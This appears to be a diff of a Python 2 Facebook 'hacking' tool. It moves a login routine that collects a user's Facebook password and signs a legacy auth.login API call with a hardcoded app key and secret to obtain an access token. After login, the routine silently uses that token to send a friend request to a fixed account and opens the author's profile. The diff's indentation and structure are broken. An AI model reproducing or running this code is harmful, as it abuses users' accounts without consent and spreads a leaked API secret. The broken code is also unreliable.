@@ -154,6 +154,7 @@ def login():
     os.system("clear")
 
     print logo
+
     print("        \033[0;90m( LOGIN MAIN MENU )").center(50)
     print("\033[1;97m---------------------------------------------------")
     print("\033[1;91m(1)\033[1;93m -> \033[1;92mLogin Using Token")
@@ -241,6 +242,61 @@ def login_select():
 
         login_select()
 
+def login_fb():
+	os.system('clear')
+	try:
+		toket = open('login.txt','r')
+		menu() 
+	except (KeyError,IOError):
+		os.system('clear')
+		print logo
+		print 42*"\033[1;96m="
+		print('\033[1;96m[☆] \x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m[☆]' )
+		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
+		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
+		tik()
+		try:
+			br.open('https://m.facebook.com')
+		except mechanize.URLError:
+			print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
+			keluar()
+		br._factory.is_html = True
+		br.select_form(nr=0)
+		br.form['email'] = id
+		br.form['pass'] = pwd
+		br.submit()
+		url = br.geturl()
+		if 'save-device' in url:
+			try:
+				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
+				x=hashlib.new("md5")
+				x.update(sig)
+				a=x.hexdigest()
+				data.update({'sig':a})
+				url = "https://api.facebook.com/restserver.php"
+				r=requests.get(url,params=data)
+				z=json.loads(r.text)
+				unikers = open("login.txt", 'w')
+				unikers.write(z['access_token'])
+				unikers.close()
+				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
+				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				menu()
+			except requests.exceptions.ConnectionError:
+				print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
+				keluar()
+		if 'checkpoint' in url:
+			print("\n\033[1;96m[!] \x1b[1;91mIt seems that your account has a checkpoint")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			keluar()
+		else:
+			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email is wrong")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			login()
 
 def menu():
 
@@ -298,66 +354,19 @@ def menu():
 
         menu()
 
-    os.system("clear")
+    os.system('clear')
+         
+        os.system("clear")
+        print logo
+        print 42*"\033[1;96m="
+	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
+	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
+	print 42*"\033[1;96m="
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start Hacking"
+	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
+	pilih()
 
-def login_fb():
-	os.system('clear')
-	try:
-		toket = open('login.txt','r')
-		menu() 
-	except (KeyError,IOError):
-		os.system('clear')
-		print logo
-		print 42*"\033[1;96m="
-		print('\033[1;96m[☆] \x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m[☆]' )
-		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
-		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
-		tik()
-		try:
-			br.open('https://m.facebook.com')
-		except mechanize.URLError:
-			print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
-			keluar()
-		br._factory.is_html = True
-		br.select_form(nr=0)
-		br.form['email'] = id
-		br.form['pass'] = pwd
-		br.submit()
-		url = br.geturl()
-		if 'save-device' in url:
-			try:
-				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
-				x=hashlib.new("md5")
-				x.update(sig)
-				a=x.hexdigest()
-				data.update({'sig':a})
-				url = "https://api.facebook.com/restserver.php"
-				r=requests.get(url,params=data)
-				z=json.loads(r.text)
-				unikers = open("login.txt", 'w')
-				unikers.write(z['access_token'])
-				unikers.close()
-				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
-				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				menu()
-			except requests.exceptions.ConnectionError:
-				print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
-				keluar()
-		if 'checkpoint' in url:
-			print("\n\033[1;96m[!] \x1b[1;91mIt seems that your account has a checkpoint")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			keluar()
-		else:
-			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email is wrong")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			login()
-
-
-def menu():
+def mnu():
 	os.system('clear')
 	try:
 		toket=open('login.txt','r').read()
